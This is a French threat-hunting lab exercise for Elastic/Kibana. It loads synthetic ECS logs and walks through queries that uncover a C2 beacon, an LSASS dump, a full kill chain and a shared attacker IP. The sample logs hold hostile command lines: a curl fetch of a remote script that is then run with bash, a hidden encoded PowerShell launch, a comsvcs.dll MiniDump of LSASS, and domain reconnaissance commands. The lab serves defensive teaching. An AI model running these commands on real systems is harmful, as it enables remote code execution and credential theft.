# TP 7 — Capstone : la chasse

> Quatre missions de threat hunting sur le jeu du lab, seul puis en équipe : trouver les beacons, les objectifs de l'adversaire, dérouler la kill chain, et relier les deux intrusions.

**Topic** : Hunt capstone

## Contexte

Le case du TP 6 est ouvert. La direction pose trois questions : **depuis quand** ? **jusqu'où** ? **est-ce fini** ? Aucune règle n'y répond : il faut **chasser**.

## Setup

Ce TP est autonome. Il utilise le **jeu de données du lab** : 25 événements ECS, dans le data stream `logs-lab-default`. Le pipeline `lab-replay` décale leurs dates, pour que le dernier ait eu lieu il y a 10 minutes — réglez le sélecteur de temps de Kibana sur **Last 4 hours**.

Envoyez ce bloc dans **Dev Tools** (le `DELETE` vide un éventuel chargement précédent) :

```json
DELETE /_data_stream/logs-lab-default

PUT /_ingest/pipeline/lab-replay
{
  "description": "Rejoue le jeu de données du lab : décale les événements pour que le dernier ait eu lieu il y a 10 minutes",
  "processors": [
    {
      "script": {
        "source": "ZonedDateTime ts = ZonedDateTime.parse(ctx['@timestamp']); long ms = ChronoUnit.MILLIS.between(ts, ZonedDateTime.parse(params.end)); ctx['@timestamp'] = metadata().now.minus(ms, ChronoUnit.MILLIS).toString();",
        "params": { "end": "2026-10-01T10:30:00Z" }
      }
    }
  ]
}

POST /logs-lab-default/_bulk?pipeline=lab-replay&refresh
{"create":{}}
{"@timestamp":"2026-10-01T07:55:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"deploy"},"source":{"ip":"10.0.0.12"},"message":"Accepted publickey for deploy from 10.0.0.12 port 40022 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52311 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52321 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:20Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52331 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:30Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52341 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:40Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52351 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:01:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Accepted password for admin from 203.0.113.50 port 52400 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"curl","command_line":"curl -s http://198.51.100.7/x.sh -o /tmp/x.sh","pid":4101,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"bash","command_line":"bash /tmp/x.sh","pid":4102,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:03:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"crontab","command_line":"crontab -l","pid":4110,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T09:58:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"winword.exe","command_line":"\"C:\\Program Files\\Microsoft Office\\WINWORD.EXE\" /n invoice.docm","pid":7001,"parent":{"name":"explorer.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"powershell.exe","command_line":"powershell.exe -nop -w hidden -enc SQBFAFgA","pid":7300,"parent":{"name":"winword.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:05Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"updater.exe","command_line":"C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe","pid":7312,"parent":{"name":"powershell.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:01:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:02:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:04:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:05:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:06:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"chrome.exe","pid":5120},"source":{"ip":"10.0.0.42","bytes":2048},"destination":{"ip":"142.250.74.110","port":443,"bytes":88000},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"whoami.exe","command_line":"whoami /all","pid":7350,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"net.exe","command_line":"net group \"Domain Admins\" /domain","pid":7351,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:15:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":4096},"destination":{"ip":"10.0.0.20","port":445,"bytes":1024},"network":{"transport":"tcp","direction":"internal"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:16:00Z","host":{"name":"db-01","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"svc_backup"},"process":{"name":"rundll32.exe","command_line":"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\l.dmp full","pid":8800,"parent":{"name":"services.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:20:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":48000000},"destination":{"ip":"198.51.100.7","port":443,"bytes":2048},"network":{"transport":"tcp","direction":"egress"}}
```

Résultat attendu (extrait) :

```json
{ "errors": false }
```

## Règles du jeu

- Chaque mission part d'une **hypothèse**. Notez-la avant de lancer une requête.
- Choisissez l'outil : Discover (KQL), ES|QL, EQL, Timeline, Lens.
- **Time-box** : 20 minutes par mission. Au bout, décidez : creuser, escalader, ou clore.
- Chaque mission se termine par un **livrable** : un constat dans le case, ou une **règle**.

## Mission 1 — Trouver les beacons

**Hypothèse** : un hôte contacte un serveur C2 à intervalle régulier.

Un beacon, c'est **beaucoup** de connexions, vers la **même** destination, avec des tailles **identiques**.

```json
POST /_query?format=json&filter_path=values
{
  "query": """
    FROM logs-lab-default
    | WHERE event.category == "network" AND network.direction == "egress"
    | STATS connections = COUNT(*), sizes = COUNT_DISTINCT(destination.bytes)
            BY host.name, process.name, destination.ip
    | WHERE connections >= 5
  """
}
```

Résultat attendu :

```json
{ "values": [[7, 2, "ws-02", "updater.exe", "198.51.100.7"]] }
```

**Questions** :

1. Pourquoi 2 tailles, et pas 1 ?
2. Quel est l'intervalle entre deux connexions ?
3. Qui a lancé `updater.exe` ?

<details>
<summary>Réponse</summary>

1. Six connexions de 1 024 octets (le beacon) et une de 2 048 (l'exfiltration, sur la même session C2).
2. 60 secondes — une régularité qu'aucun humain ne produit.
3. `powershell.exe`, lui-même lancé par `winword.exe` :

```json
POST /logs-lab-default/_search?filter_path=hits.hits._source.process.parent.name
{
  "query": { "term": { "process.name": "updater.exe" } }
}
```

Résultat attendu :

```json
{ "hits": { "hits": [{ "_source": { "process": { "parent": { "name": "powershell.exe" } } } }] } }
```

</details>

**Livrable** : une règle ES|QL *Beaconing* — `connections >= 5` vers une même destination en 10 minutes.

## Mission 2 — Les objectifs de l'adversaire

**Hypothèse** : une fois entré, l'adversaire **reconnaît** le domaine et **vole des identifiants**.

```json
POST /logs-lab-default/_eql/search?filter_path=hits.events._source.host.name,hits.events._source.process.name
{
  "query": """
    process where process.name in ("whoami.exe", "net.exe", "nltest.exe", "rundll32.exe")
      and process.command_line : ("*whoami*", "*Domain Admins*", "*domain_trusts*", "*comsvcs*MiniDump*")
  """
}
```

Résultat attendu (extrait) :

```json
{
  "hits": {
    "events": [
      { "_source": { "host": { "name": "ws-02" }, "process": { "name": "whoami.exe" } } },
      { "_source": { "host": { "name": "ws-02" }, "process": { "name": "net.exe" } } },
      { "_source": { "host": { "name": "db-01" }, "process": { "name": "rundll32.exe" } } }
    ]
  }
}
```

**Questions** :

1. Que fait `rundll32.exe comsvcs.dll, MiniDump 624 …` ?
2. Comment l'adversaire est-il arrivé sur `db-01` ?

<details>
<summary>Réponse</summary>

1. Il **dumpe la mémoire de LSASS** (PID 624) : les identifiants de tous les comptes connectés à `db-01` — T1003.001.
2. Par **SMB** depuis `ws-02` : `updater.exe` ouvre une connexion vers `10.0.0.20:445` à 10:15, une minute avant le dump.

</details>

**Livrable** : une règle EQL *LSASS dump via comsvcs.dll*, severity **Critical**.

## Mission 3 — Dérouler la kill chain

**Hypothèse** : le beacon n'est qu'une étape ; il y a un **avant** et un **après**.

Partez du beacon et remontez, puis descendez, sur `ws-02` :

```json
POST /_query?format=json&filter_path=values
{
  "query": """
    FROM logs-lab-default
    | WHERE host.name == "ws-02"
    | EVAL step = CASE(
        process.parent.name == "explorer.exe", "1 delivery",
        process.parent.name == "winword.exe", "2 execution",
        process.parent.name == "powershell.exe", "3 installation",
        destination.ip == "198.51.100.7" AND source.bytes > 10000000, "7 exfiltration",
        destination.ip == "198.51.100.7", "4 command and control",
        process.parent.name == "updater.exe", "5 discovery",
        destination.port == 445, "6 lateral movement",
        "?")
    | STATS events = COUNT(*) BY step
    | SORT step
  """
}
```

Résultat attendu :

```json
{
  "values": [
    [1, "1 delivery"],
    [1, "2 execution"],
    [1, "3 installation"],
    [6, "4 command and control"],
    [2, "5 discovery"],
    [1, "6 lateral movement"],
    [1, "7 exfiltration"],
    [1, "?"]
  ]
}
```

**Question** : quel est l'événement `?`, et faut-il creuser ?

<details>
<summary>Réponse</summary>

La connexion de `chrome.exe` vers `142.250.74.110` — du trafic web ordinaire, vu une fois, gros volume **entrant**. On s'arrête : c'est expliqué. On le **note** dans le case, pour que l'équipe suivante ne refasse pas le travail.

</details>

**Livrable** : la kill chain complète, en commentaire du case, avec l'heure de chaque étape.

## Mission 4 — Full-spectrum : une ou deux intrusions ?

**Hypothèse** : le brute force de `web-01` et le phishing de `ws-02` sont la **même** campagne.

```json
POST /_query?format=json&filter_path=values
{
  "query": """
    FROM logs-lab-default
    | WHERE destination.ip == "198.51.100.7" OR process.command_line LIKE "*198.51.100.7*"
    | STATS events = COUNT(*) BY host.name
    | SORT host.name
  """
}
```

Résultat attendu :

```json
{ "values": [[1, "web-01"], [7, "ws-02"]] }
```

**Questions** :

1. Quel est le lien ?
2. Qu'a fait l'adversaire sur `web-01` après le script ?
3. Quelles réponses proposez-vous, dans quel ordre ?

<details>
<summary>Réponse</summary>

1. La même **infrastructure** : `198.51.100.7` sert le script de `web-01` et le C2 de `ws-02`.
2. `crontab -l` à 08:03 — il regarde la persistance possible. À vérifier sur la machine : une entrée cron a-t-elle été ajoutée ?
3. **Contenir** : isoler `ws-02`, `db-01` et `web-01` ; bloquer `198.51.100.7` et `203.0.113.50`. **Éradiquer** : supprimer `updater.exe`, `/tmp/x.sh`, vérifier cron. **Récupérer** : réinitialiser `admin`, `alice`, et **tous** les comptes connectés à `db-01` (dump LSASS). **Apprendre** : les règles des missions 1 et 2.

</details>

## En équipe

Répartissez la kill chain : une personne par phase (accès initial, C2, actions sur objectifs, infrastructure). Travaillez dans **une** timeline partagée et **un** case. 20 minutes, puis restitution de 5 minutes par phase :

- l'hypothèse ;
- les requêtes ;
- le constat ;
- la règle ou l'exception qui en sort.

## Critères de succès

- [ ] Le beacon `ws-02` → `198.51.100.7` est identifié, avec son intervalle
- [ ] Le dump LSASS sur `db-01` et le mouvement latéral qui y mène sont trouvés
- [ ] La kill chain de `ws-02` est complète, l'événement bénin écarté
- [ ] Le lien entre les deux intrusions est établi
- [ ] Au moins deux nouvelles règles sont nées de la chasse

## Dépannage

| Symptôme | Cause probable | Solution |
|----------|----------------|----------|
| `Unknown index [logs-lab-default]` | Setup non chargé | Envoyez le bloc du setup |
| `LIKE` ne trouve rien | `process.command_line` est un `wildcard` | `LIKE "*…*"` fonctionne ; vérifiez les `*` |
| La séquence EQL ne renvoie rien | `maxspan` trop court | Les étapes sont espacées de plusieurs minutes |

## Pour aller plus loin

- **Attack Discovery** (avec un connecteur LLM) : sur les alertes des TP 5 et 7, retrouve-t-il les deux intrusions comme **une** attaque ?
- Le journal de chasse : hypothèse, données, requêtes, constat, règle — dans un case dédié.
